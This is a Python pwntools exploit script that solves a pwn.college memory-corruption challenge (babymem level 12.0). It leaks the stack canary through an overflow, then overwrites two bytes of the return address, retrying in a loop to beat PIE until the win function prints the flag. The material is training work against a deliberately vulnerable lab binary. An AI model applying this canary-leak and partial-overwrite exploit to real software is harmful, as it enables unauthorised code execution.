#!/usr/bin/python3
from pwn import *

# Retrieve the ELF information from the binary
elf = ELF('/challenge/babymem_level12.0')

# Set the first two bytes to use in the return address
win_address = b"\x5d\x1b"

# Compute the distance from the buffer to the canary on the stack
buffer_offset = 0x28
canary_offset = 0x10
canary_distance = buffer_offset - canary_offset

# NOTE: because the binary uses PIE (Positional Independent Execution) we have to
#       try multiple times until the win_authed function will be loaded in our guessed
#       address.
#       This can be done because the addresses are aligned 0x1000, then the first 3 nibbles
#       are fixed and the 4th changes at every time execution.
while True:
    # Run the program
    io = elf.process()

    # Send the size of the first payload to the program
    io.recvuntil(b'Payload size: ')
    io.sendline(f"{canary_distance+1}".encode())

    # Build and send the payload to the program
    # NOTE: the payload will overwrite the first byte of the canary in order
    #       to make the program print it. Also, the payload will trigger the
    #       secret method to call another time the 'challenge' method before
    #       returning in order to avoid stack smashing.
    PAYLOAD = b'A'*(canary_distance-6)+b'REPEATB'
    io.recvuntil(b'bytes)!')
    io.sendline(PAYLOAD)

    # Retrieve the canary by reading the output and selecting the correct bytes
    io.recvuntil(b'REPEATB')
    canary = b'\x00' + io.recvline().strip()[:7]

    # Send the size of the second payload to the program
    io.recvuntil(b'Payload size: ')
    io.sendline(f'{buffer_offset + 2}'.encode())

    # Build and send the payload to the program
    # NOTE: this time the payload will contain the correct canary value
    #       and will overwrite the first two bytes of the return address
    PAYLOAD = b'A'*(canary_distance) + canary + b'B'*8 + win_address
    io.recvuntil(b'bytes)!')
    io.sendline(PAYLOAD)

    # Retrieve the possible flag
    io.recvuntil(b'Goodbye!')
    flag = io.recvall().decode()

    # Check if the flag has been retrieved correctly
    if 'pwn.college' in flag:
        print(flag)
        break